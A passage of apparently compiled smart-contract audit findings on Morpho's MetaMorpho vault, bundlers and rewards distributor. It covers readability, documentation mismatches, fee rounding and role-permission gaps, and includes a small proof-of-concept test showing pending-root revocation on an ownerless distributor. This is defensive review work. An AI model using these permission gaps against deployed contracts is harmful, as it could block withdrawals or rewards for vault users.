**Description:**

The code utilizes mappings for various variables. To enhance code readability, it is advisable to use named mappings. If named mappings are not preferred, adding inline comments can still improve code readability.

**Recommendation:**

To address this issue, it is recommended to incorporate named mappings. An example would be:

```solidity
mapping(address => bool) public isAllocator;

// change to

mapping(address caller => bool isSetAsAllocator) public isAllocator;
```
This adjustment improves the clarity of the code and makes it more understandable for developers.



### Inconsistent parentheses in if/else

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description

Most of the if/checks at Metamorpho are lacking parenthesis, despite the fact there are no best practices on whether to have parenthesis or not, but in terms of readability it is better to have them. Currently, due to the size and complexity of the contract, the reader can easily be confused with the logic of the checks. 

For your convenience, we placed all the lines that are with and without parenthesis below:

- Without parenthesis:

- `if ({morpho, skimRecipient} == address(0)) revert ErrorsLib.ZeroAddress();` - [126](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L126), [514](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L514)
- `if (sender != curator && sender != owner()) revert ErrorsLib.NotCuratorRole();` - [141](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L141)
- `if (_msgSender() != owner() && _msgSender() != guardian) revert ErrorsLib.NotGuardianRole();` - [158](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L158)
- `if (block.timestamp < validAt) revert ErrorsLib.TimelockNotElapsed();` - [178](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L178)
- `if (VARIABLE == curator) revert ErrorsLib.AlreadySet();`
    - newCurator - [187](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L187)
    - isAllocator[newAllocator] - [196](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L196)
    - newSkimRecipient - [205](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L205)
    - newTimelock - [216](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L216)
    - newFee - [234](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L234)
    - newFeeRecipient - [249](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L249)
    - newGuardian - [266](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L266)
    - newSupplyCap - [292](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L292)
    - config[id].removableAt - [309](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L309)
- `if (newTimelock == pendingTimelock.value) revert ErrorsLib.AlreadyPending();` - [223](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L223), [298](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L298)
- `if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();` - [235](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L235)
- `if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();` - [236](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L236), [250](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L250)
- `if (marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);` - [288](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L288), [408](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L408)
- `if (MORPHO.lastUpdate(id) == 0) revert ErrorsLib.MarketNotCreated();` - [289](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L289)
- `if (!config[id].enabled) revert ErrorsLib.MarketNotEnabled();` - [310](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L310)
- `if (length > ConstantsLib.MAX_QUEUE_LENGTH) revert ErrorsLib.MaxQueueLengthExceeded();` - [328](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L328)
- `if (config[newSupplyQueue[i]].cap == 0) revert ErrorsLib.UnauthorizedMarket(newSupplyQueue[i]);` - [331](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L331), [431](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L431)
- `if (seen[prevIndex]) revert ErrorsLib.DuplicateMarket(id);` - [358](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L358)
- `if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);` - [371](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L371)
- `if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);` - [433](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L433)
- `if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();` - [445](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L445)
- `if (pendingTimelock.validAt == 0) revert ErrorsLib.NoPendingValue();` - [177](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L177), [452](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L452), [461](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L461), [470](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L470)
- `if (newTimelock {>, <} ConstantsLib.MAX_TIMELOCK) revert ErrorsLib.AboveMaxTimelock();` - [743](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L743), [744](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L744)
- `if (assets != 0) revert ErrorsLib.AllCapsReached();` - [819](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L819)
- `if (assets != 0) revert ErrorsLib.NotEnoughLiquidity();` - [843](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L843)

- With parenthesis:

- `if (!isAllocator[sender] && sender != curator && sender != owner()) {` - [149](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L149)
- `if (_msgSender() != guardian && _msgSender() != curator && _msgSender() != owner()) {` - [165](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L165)
- `if (pendingGuardian.validAt != 0 && newGuardian == pendingGuardian.value) {` - [271](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L271)
- `if (block.timestamp < config[id].removableAt) {` - [373](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L373)

- Recommendation

Consider making all the if checks contain parenthesis as this will improve the reading experience and will make future development and audits easier.



### Add Inline comments for unnamed return parameters

**Severity:** Informational

**Context:** [ERC20PermissionedBase.sol#L52-L52](erc20-permissioned/src/ERC20PermissionedBase.sol#L52-L52), [ERC20PermissionedBase.sol#L58-L58](erc20-permissioned/src/ERC20PermissionedBase.sol#L58-L58), [MetaMorpho.sol#L526-L526](metamorpho/src/MetaMorpho.sol#L526-L526), [MetaMorpho.sol#L531-L531](metamorpho/src/MetaMorpho.sol#L531-L531), [MetaMorpho.sol#L536-L536](metamorpho/src/MetaMorpho.sol#L536-L536), [MetaMorpho.sol#L552-L552](metamorpho/src/MetaMorpho.sol#L552-L552), [MetaMorpho.sol#L622-L622](metamorpho/src/MetaMorpho.sol#L622-L622), [MetaMorpho.sol#L657-L657](metamorpho/src/MetaMorpho.sol#L657-L657), [MetaMorpho.sol#L678-L678](metamorpho/src/MetaMorpho.sol#L678-L678), [MetaMorpho.sol#L848-L848](metamorpho/src/MetaMorpho.sol#L848-L848), [MetaMorpho.sol#L883-L883](metamorpho/src/MetaMorpho.sol#L883-L883), [BaseBundler.sol#L42-L42](morpho-blue-bundlers/src/BaseBundler.sol#L42-L42), [BaseBundler.sol#L87-L87](morpho-blue-bundlers/src/BaseBundler.sol#L87-L87), [EthereumBundler.sol#L39-L39](morpho-blue-bundlers/src/ethereum/EthereumBundler.sol#L39-L39), [GoerliBundler.sol#L39-L39](morpho-blue-bundlers/src/goerli/GoerliBundler.sol#L39-L39), [AaveV2MigrationBundler.sol#L64-L64](morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol#L64-L64), [CompoundV2MigrationBundler.sol#L78-L78](morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol#L78-L78), [MigrationBundler.sol#L27-L27](morpho-blue-bundlers/src/migration/MigrationBundler.sol#L27-L27), [MorphoBundler.sol#L279-L279](morpho-blue-bundlers/src/MorphoBundler.sol#L279-L279), [AdaptiveCurveIrm.sol#L94-L94](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L94-L94), [AdaptiveCurveIrm.sol#L100-L100](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L100-L100), [AdaptiveCurveIrm.sol#L117-L117](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L117-L117), [AdaptiveCurveIrm.sol#L175-L175](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L175-L175), [AdaptiveCurveIrm.sol#L184-L184](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L184-L184), [ExpLib.sol#L25-L25](morpho-blue-irm/src/libraries/adaptive-curve/ExpLib.sol#L25-L25), [MathLib.sol#L13-L13](morpho-blue-irm/src/libraries/MathLib.sol#L13-L13), [MathLib.sol#L17-L17](morpho-blue-irm/src/libraries/MathLib.sol#L17-L17), [ChainlinkOracle.sol#L116-L116](morpho-blue-oracles/src/ChainlinkOracle.sol#L116-L116), [ChainlinkDataFeedLib.sol#L20-L20](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L20-L20), [ChainlinkDataFeedLib.sol#L31-L31](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L31-L31), [VaultLib.sol#L13-L13](morpho-blue-oracles/src/libraries/VaultLib.sol#L13-L13)

**Description:**

The functions inside the Morpho code often include unnamed return parameters. This practice can reduce code readability. To enhance clarity, it is recommended to use inline comments for unnamed return parameters.

**Recommendation:**

Adapt the code by adding inline comments for unnamed return parameters. For example:
```solidity
returns (uint256, address)
```
can be updated to:
```solidity
returns (uint256 /* a */, address /* b */)
```
This adjustment improves code documentation and makes it easier for developers to understand the purpose of each return value.



### Constant redefined elsewhere	_(duplicate of [Constant redefined elsewhere])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The current protocol codebase exhibits multiple instances where constants are redundantly defined across different contracts. This practice risks creating inconsistencies, especially if a constant is updated in one location but not in others. Such discrepancies can lead to confusion and potential errors in the contract's execution.

- Instances
1. `WETH`, `WST_ETH`, `DAI` addresses in `MainnetLib.sol` at lines [6](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L6-L6), [9](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L9-L9), [12](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L12-L12).
2. `UNSET_INITIATOR` in `ConstantsLib.sol` at line [5](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/libraries/ConstantsLib.sol#L5-L5).
3. `ZERO_ADDRESS` in `ErrorsLib.sol` and `ErrorsLib.sol` of `morpho-blue-irm` at lines [21](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/libraries/ErrorsLib.sol#L21-L21), [16](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/ErrorsLib.sol#L16-L16) respectively.

- Recommendation
Consolidate the definition of constants in a single contract, preferably in an internal library. This approach ensures consistency and avoids the risk of values becoming out of sync.



### For loops in public or external functions should be avoided due to high gas costs and possible DOS

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description 
The codebase of `MetMorpho.sol` contract contains several instances where for loops are used in `public` or `external` functions. This practice can be problematic due to the high gas costs and potential Denial of Service (DoS) vulnerabilities. For loops, especially nested ones, can become gas-intensive, potentially leading to functions running out of gas or becoming prohibitively expensive to call.

<details>

```solidity
📁 File: metamorpho/src/MetaMorpho.sol

/// @audit line 330
325:     function setSupplyQueue(Id[] calldata newSupplyQueue) external onlyAllocatorRole { 
326:         uint256 length = newSupplyQueue.length;
327: 
328:         if (length > ConstantsLib.MAX_QUEUE_LENGTH) revert ErrorsLib.MaxQueueLengthExceeded();
329: 
330:         for (uint256 i; i < length; ++i) {
331:             if (config[newSupplyQueue[i]].cap == 0) revert ErrorsLib.UnauthorizedMarket(newSupplyQueue[i]);
332:         }
333: 
334:         supplyQueue = newSupplyQueue;
335: 
336:         emit EventsLib.SetSupplyQueue(_msgSender(), newSupplyQueue);
337:     }

/// @audit line 353
/// @audit line 364
346:     function updateWithdrawQueue(uint256[] calldata indexes) external onlyAllocatorRole { 
347:         uint256 newLength = indexes.length;
348:         uint256 currLength = withdrawQueue.length;
349: 
350:         bool[] memory seen = new bool[](currLength);
351:         Id[] memory newWithdrawQueue = new Id[](newLength);
352: 
353:         for (uint256 i; i < newLength; ++i) {
354:             uint256 prevIndex = indexes[i];
355: 
356:             // If prevIndex >= currLength, it will revert with native "Index out of bounds".
357:             Id id = withdrawQueue[prevIndex];
358:             if (seen[prevIndex]) revert ErrorsLib.DuplicateMarket(id);
359:             seen[prevIndex] = true;
360: 
361:             newWithdrawQueue[i] = id;
362:         }
363: 
364:         for (uint256 i; i < currLength; ++i) {
365:             if (!seen[i]) {
366:                 Id id = withdrawQueue[i];
367: 
368:                 if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);
369: 
370:                 if (MORPHO.supplyShares(id, address(this)) != 0) {
371:                     if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);
372: 
373:                     if (block.timestamp < config[id].removableAt) {
374:                         revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
375:                     }
376:                 }
377: 
378:                 delete config[id];
379:             }
380:         }
381: 
382:         withdrawQueue = newWithdrawQueue;
383: 
384:         emit EventsLib.SetWithdrawQueue(_msgSender(), newWithdrawQueue);
385:     }

/// @audit line 400
397:     function reallocate(MarketAllocation[] calldata allocations) external onlyAllocatorRole { 
398:         uint256 totalSupplied;
399:         uint256 totalWithdrawn;
400:         for (uint256 i; i < allocations.length; ++i) {
401:             MarketAllocation memory allocation = allocations[i];
402:             Id id = allocation.marketParams.id();
403: 
404:             (uint256 supplyAssets, uint256 supplyShares,) = _accruedSupplyBalance(allocation.marketParams, id);
405:             uint256 withdrawn = supplyAssets.zeroFloorSub(allocation.assets);
406: 
407:             if (withdrawn > 0) {
408:                 if (allocation.marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
409: 
410:                 // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
411:                 uint256 shares;
412:                 if (allocation.assets == 0) {
413:                     shares = supplyShares;
414:                     withdrawn = 0;
415:                 }
416: 
417:                 (uint256 withdrawnAssets, uint256 withdrawnShares) =
418:                     MORPHO.withdraw(allocation.marketParams, withdrawn, shares, address(this), address(this));
419: 
420:                 emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);
421: 
422:                 totalWithdrawn += withdrawnAssets;
423:             } else {
424:                 uint256 suppliedAssets = allocation.assets == type(uint256).max
425:                     ? totalWithdrawn.zeroFloorSub(totalSupplied)
426:                     : allocation.assets.zeroFloorSub(supplyAssets);
427: 
428:                 if (suppliedAssets == 0) continue;
429: 
430:                 uint256 supplyCap = config[id].cap;
431:                 if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);
432: 
433:                 if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);
434: 
435:                 // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.
436:                 (, uint256 suppliedShares) =
437:                     MORPHO.supply(allocation.marketParams, suppliedAssets, 0, address(this), hex"");
438: 
439:                 emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);
440: 
441:                 totalSupplied += suppliedAssets;
442:             }
443:         }
444: 
445:         if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
446:     }

/// @audit line 614
613:     function totalAssets() public view override returns (uint256 assets) { 
614:         for (uint256 i; i < withdrawQueue.length; ++i) {
615:             assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
616:         }
617:     }
```
[325](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L325-L337), [346](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L346-L385), [397](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L397-L446), [613](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L613-L617)

- Recommendation
Where possible, refactor the code to minimize the use of for loops in `public` and `external` functions. Consider alternative logic that achieves the same result with less gas consumption and lower risk of DoS attacks.



### Incorrect link in IAaveV3 interface

**Severity:** Informational

**Context:** [IAaveV3.sol#L96-L96](morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol#L96-L96), [IAaveV3.sol#L170-L170](morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol#L170-L170)

**Description**:

The IAaveV3 interface includes an invalid link `https://eips.ethereum.org/EIPS/eip-713` which directs to a page that returns a 404 error. This may lead to confusion for users and seems unprofessional.

**Recommendation**:

Replace the incorrect link with the correct link `https://eips.ethereum.org/EIPS/eip-712`.



### `setFee()` has no timelock, contrary to MetaMorpho's README	_(duplicate of [`setFee` is not time-locked])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Context:**

- [MetaMorpho.sol#L232-L245](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L232-L245)

**Description:**

MetaMorpho's [README](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8#readme) states that all permissioned actions that might harm users in a vault is timelocked, including increasing the vault's fee:

> All actions that may be against users' interests (e.g. enabling a market with a high exposure, increasing the fee) are subject to a timelock of minimum 12 hours. If set, the `guardian` can revoke the action during the timelock except for the fee increase. After the timelock, the action can be executed by anyone.

However, `setFee()` in `MetaMorpho.sol` does not have a timelock. As such, a vault's owner can increase the vault's fee before users have time to react.

**Recommendation:**

Add timelock functionality to `setFee()` when the fee is increased.



### code doesn't calculates managers fee based  on net profit and there is no penalty if manager cause loss for users

**Severity:** Informational

**Context:** [MetaMorpho.sol#L914-L914](metamorpho/src/MetaMorpho.sol#L914-L914)

Metamorpho's managers will receive fee from interests they earn for Metamopho's users. the issue is that code doesn't consider the losses the mangers causes for users.
if bad debt realization happens for one of the markets then Metamorpho's totalAsset will decrease and code would just ignore it. I believe to make managers responsible to not make obvious mistake regarding risk managments, code should have penalties for any loss caused by managers.

for example code can calculate loss based on `lastTotalAssets.eroFloorSub(newTotalAssets.)` calculation and store it only allow fee distribution when total loss is zero, while reducing the fee from totalloss.  (code should keep track of net profit and calculates fee if net profit increase)



### fee amount can be zero or with none trivail error for some setups because of division rounding error

**Severity:** Informational

**Context:** [MetaMorpho.sol#L919-L919](metamorpho/src/MetaMorpho.sol#L919-L919)

fee amount will be zero for some setups if it calculated frequently. the blew formula shows for how much total balance fee calculation will be zero:
`B0 = 1 / (seconds * ((1+apy) ^ (1 / (365 * 24 * 60 * 60)) - 1)) /fee`
`APY` is average yearly return of the underlying markets and `fee` is fee in the metamorpho and `seconds` is average elapsed times between the metamorpho interactions.

for example if `fee = 0.01` and `apy = 0.05` and `seconds = 12` then:
`B0 = 1 / (10 * ((1+0.05) ^ (1 / (365 * 24 * 60 * 60)) - 1)) /0.01= 6463597735 = 6.4 * 10^9`


also for any balance less than `N * B0` we will have none trivial rounding error(`100/N %`) that will make real fee percentage different than define fee percentage.

for example for if balance was lower than `50 * B0` then fee calculation will have `100/50 = 2%` error for `fee = 0.01` and `apy = 0.05` and `seconds = 12`.


this issue is severe for tokens with low precision. because users gonna interact with the system in each block so the intervals will be low and calculations have rounding errors.

because `feeShare` have more precision I suggest calculating fee share directly to reduce the rounding errors and support more range of token percisions.



### Incorrect documentation of the ZERO_INPUT error

**Severity:** Informational

**Context:** [ErrorsLib.sol#L18-L18](morpho-blue-irm/src/libraries/ErrorsLib.sol#L18-L18)

**Improved Description:**

The comment associated with the `ZERO_INPUT` error erroneously describes it as `/// @dev Thrown when passing the zero input.` However, a closer examination of its usage in `AdaptiveCurveIrm` reveals a more accurate description.

```solidity
require(targetUtilization > 0, ErrorsLib.ZERO_INPUT);
```

Contrary to the initial comment, the error is thrown not only when the input is zero but also when it is below zero, considering that `targetUtilization` is an `int256` and can assume negative values.

**Recommendation:**

To address this discrepancy, it is recommended to revise the comment to accurately reflect the error's behavior, such as `/// @dev Thrown when passing any input that is <= zero`. Additionally, it is advisable to update the error name and its corresponding string to align with this corrected description.



### Functions missing documentation

**Severity:** Informational

**Context:** [ERC20PermissionedBase.sol#L58-L58](erc20-permissioned/src/ERC20PermissionedBase.sol#L58-L58), [MathLib.sol#L13-L13](morpho-blue-irm/src/libraries/MathLib.sol#L13-L13), [MathLib.sol#L17-L17](morpho-blue-irm/src/libraries/MathLib.sol#L17-L17)

**Improved Description:**

The codebase lacks comprehensive documentation for various functionalities, which increases the likelihood of misuse or incorrect application of these functions.

**Recommendation:**

To address this issue, it is crucial to enhance the codebase by adding comprehensive comments to elucidate the intended use and behavior of each function. This will facilitate a better understanding for developers and users, reducing the risk of misuse and promoting code correctness.



### IRM is lacking documentation

**Severity:** Informational

**Context:** [README.md#L1-L1](morpho-blue-irm/README.md#L1-L1)

**Improved Description:**

The `morpho-blue-irm` library lacks documentation in its `Readme.md` file, in contrast to other morpho periphery libraries. This absence of information makes it challenging for developers to comprehend the library's functionality, creating a deviation from the documentation standard established by other libraries in the morpho periphery.

**Recommendation:**

To align with documentation standards and enhance developer understanding, it is recommended to populate the `Readme.md` file of the `morpho-blue-irm` library with documentation detailing its functionality and usage. This will contribute to a consistent and informative documentation structure across the morpho periphery libraries.



### Curator and Guardian can revoke pending market removal

**Severity:** Informational

**Context:** [MetaMorpho.sol#L478-L478](metamorpho/src/MetaMorpho.sol#L478-L478)

- Bug Description

The documentation for MetaMorpho in `Readme.md` inaccurately specifies that a holder of the curator role can solely revoke the pending cap of any market, as indicated in the bullet point "Revoke the pending cap of any market.". It also states that the holder of the guardian role can only revoke the pending timelock, guardian and cap. 

However, the actual implementation deviates from this claim. The curator and guardian are also able to revoke any pending market removal through the `revokePendingMarketRemoval()` function, which is restricted by the `onlyCuratorOrGuardianRole` modifier.

- Impact

This discrepancy between the documented permissions and the implemented functionality results in an inconsistency within MetaMorpho. An authorized role possesses more powers than intended, enabling a curator or guardian to impede all market removals by perpetually removing pending market removals. Given that the market removal feature is designed to address malfunctioning markets causing withdrawal failures, this opens the door to a denial-of-service (DOS) scenario for withdrawals until the curator is removed.

- Proof of Concept
The issue arises from the utilization of the `onlyCuratorOrGuardianRole` modifier in the `revokePendingMarketRemoval()` function:

```solidity
/// @notice Revokes the pending removal of the market defined by `id`.
function revokePendingMarketRemoval(Id id) external onlyCuratorOrGuardianRole {
	delete config[id].removableAt;
	
	emit EventsLib.RevokePendingMarketRemoval(_msgSender(), id);
}
```

This modifier permits the curator or guardian role to call functions using it:

```solidity
modifier onlyCuratorOrGuardianRole() {
	if (_msgSender() != guardian && _msgSender() != curator && _msgSender() != owner()) {
		revert ErrorsLib.NotCuratorNorGuardianRole();
	}
	
	_;
}
```

In summary, the curator and guardian, contrary to the documentation, can revoke pending market removals.

- Recommended Mitigation Steps

To align the implemented functionality with the intended access restrictions, the documentation should clarify whether the functionality is exclusively for the guardian, the curator, both or just the owner. The appropriate modifiers (`onlyOwner`, `onlyGuardianRole`, `onlyCuratorOrGuardianRole`) should be employed to enforce these restrictions.



### Pending root can be revoked on ownerless URD

**Severity:** Informational

**Context:** [UniversalRewardsDistributor.sol#L100-L100](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L100-L100)

- Bug Description

The Morpho periphery incorporates the `UniversalRewardsDistributor` (URD), designed to distribute rewards based on a predefined scheme to addresses. The contract assigns two privileged roles, the owner and the updaters. Notably, the owner's address can be set to `address(0)`, rendering the URD ownerless indefinitely.

As per the URD documentation in `Readme.md`, an ownerless contract is intended and operates differently than an owned one. This functionality is articulated as follows: "If the owner is set to the zero address, the contract becomes ownerless. In this scenario, only updaters can submit a root. Furthermore, the time-lock value becomes unchangeable, and pending values cannot be removed."

The issue arises from the statement that in an ownerless account, pending roots should not be removable. However, in the URD implementation, pending roots can be removed using the `revokePendingRoot()` function.

```solidity
function revokePendingRoot() external onlyUpdaterRole {
	require(pendingRoot.validAt != 0, ErrorsLib.NO_PENDING_ROOT);
	
	delete pendingRoot;
	
	emit EventsLib.PendingRootRevoked(msg.sender);
}
```

In this snippet, the `revokePendingRoot()` function is restricted using the `onlyUpdaterRole` modifier. The problem lies in the documentation's assertion that this function should only be callable by the owner, while, in reality, any holder of the updater role can invoke it.

```solidity
modifier onlyUpdaterRole() {
	require(isUpdater[msg.sender] || msg.sender == owner, ErrorsLib.NOT_UPDATER_ROLE);
	_;
}
```

- Impact

This leads to an incorrect security assumption based upon the documentation of the Urd. A user will trust that the pending root can not be revoked anymore and will become the new root after the timelock, as the Urd is ownerless. This is indeed not the case as any updater can revoke the pending root.

- POC

The following POC showcases the functionality still working on an ownerless URD.

```solidity
function testPendingRootShouldNotBeRevokableOnOwnerlessUrd() public {
    vm.startPrank(owner);
    distributionWithTimeLock.submitRoot(DEFAULT_ROOT, DEFAULT_IPFS_HASH);

    //Urd becomes ownerless
    distributionWithTimeLock.setOwner(address(0));
    vm.stopPrank();

    vm.prank(updater);
    distributionWithTimeLock.revokePendingRoot();

    //Root can still be revoked
    PendingRoot memory pendingRoot = distributionWithTimeLock.pendingRoot();
    assertEq(pendingRoot.root, bytes32(0));
    assertEq(pendingRoot.validAt, 0);
}
```

The testcase can be executed by adding it to the `/test/universal-rewards-distributor/UniversalRewardsDistributorTest.sol` file and running `forge test -vvvv --match-test "testPendingRootShouldNotBeRevokableOnOwnerlessUrd"`.

- Recommended Mitigation Steps

To address this issue, the modifier of the `revokePendingRoot()` function should be modified from `onlyUpdaterRole` to `onlyOwner`. This adjustment can be implemented as shown below:

```solidity
function revokePendingRoot() external onlyOwner {
	require(pendingRoot.validAt != 0, ErrorsLib.NO_PENDING_ROOT);
	
	delete pendingRoot;
	
	emit EventsLib.PendingRootRevoked(msg.sender);
}
```




### An Updater can perform the same function using SetRoot and SubmitRoot

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**

In the function `UniversalRewardsDistributor.submitRoot`, it intended that an updater uses this fucntion when it wants to update the root but put it in a pending state, 

```
function submitRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {
        // @audit-issue there is no difference between this function and setRoot when timelock == 0, 
        // meaning this function should also check that timelock > 0, updater can call this then
        // call accept in same transaction since the time is zero
        // This is also problematic as the pendign event wull be emitted and 
